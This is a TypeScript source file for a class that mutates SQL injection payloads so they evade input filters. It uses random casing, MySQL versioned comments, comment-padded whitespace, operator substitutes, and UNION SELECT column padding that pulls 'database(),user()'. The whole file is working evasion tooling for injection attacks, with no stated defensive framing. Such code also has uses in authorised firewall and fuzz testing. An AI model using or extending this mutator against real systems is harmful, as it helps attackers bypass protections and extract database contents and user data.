export class ASTMutator {
  private sqlKeywords = ["UNION", "SELECT", "OR", "AND", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM"];
  
  private strategies: Record<string, (payload: string) => string> = {
    "whitespace_camo": this._whitespace_camouflage.bind(this),
    "case_mutation": this._case_mutation.bind(this),
    "logical_alts": this._logical_equivalents.bind(this),
    "inline_comments": this._inline_version_comments.bind(this),
    "union_balance": this._balance_union_columns.bind(this),
    "junk_fill": this._junk_filling.bind(this)
  };

  public mutate(payload: string): string {
    let mutated = String(payload);
    if (mutated.startsWith("0x")) return mutated;
        
    // Apply 2 random mutations
    const strategyKeys = Object.keys(this.strategies);
    const chosenStrats = this._shuffle(strategyKeys).slice(0, 2);
    
    for (const strat of chosenStrats) {
      mutated = this.strategies[strat](mutated);
    }
        
    return mutated;
  }

  private _case_mutation(payload: string): string {
    return payload.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
  }

  private _whitespace_camouflage(payload: string): string {
    const complexSpaces = ["/**/", "/*!*/", " \n ", " \t ", "/*!50000*/"];
    const parts = payload.split(/\s+/);
    if (parts.length <= 1) return payload;
    return parts.slice(0, -1).map(part => part + complexSpaces[Math.floor(Math.random() * complexSpaces.length)]).join('') + parts[parts.length - 1];
  }

  private _inline_version_comments(payload: string): string {
    let mutated = payload;
    for (const kw of this.sqlKeywords) {
      const regex = new RegExp(`\\b${kw}\\b`, 'gi');
      if (regex.test(mutated)) {
        const randVer = Math.floor(Math.random() * 20000) + 40000;
        mutated = mutated.replace(regex, `/*!${randVer}${kw}*/`);
      }
    }
    return mutated;
  }

  private _logical_equivalents(payload: string): string {
    const equivalents: Record<string, string[]> = {
      "1=1": ["true", "not false", "~0=~0", "8<=>8"],
      "OR": ["||", "XOR"],
      "AND": ["&&"]
    };
    let mutated = payload;
    for (const [pattern, alts] of Object.entries(equivalents)) {
      const regex = new RegExp(pattern, 'gi');
      mutated = mutated.replace(regex, () => alts[Math.floor(Math.random() * alts.length)]);
    }
    return mutated;
  }

  private _balance_union_columns(payload: string): string {
    if (payload.toUpperCase().includes("UNION") && payload.toUpperCase().includes("SELECT")) {
      const columnOptions = ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2", "database(),user()"];
      const parts = payload.split(/SELECT\s+/i);
      if (parts.length >= 2) {
        return `${parts[0]}SELECT ${columnOptions[Math.floor(Math.random() * columnOptions.length)]}`;
      }
    }
    return payload;
  }

  private _junk_filling(payload: string): string {
    const junk = ["bypass", "unit804", "audit"];
    if (payload.includes("/**/")) {
      return payload.replace("/**/", `/*${junk[Math.floor(Math.random() * junk.length)]}*/`);
    }
    return payload;
  }

  private _shuffle<T>(array: T[]): T[] {
    return [...array].sort(() => Math.random() - 0.5);
  }
}
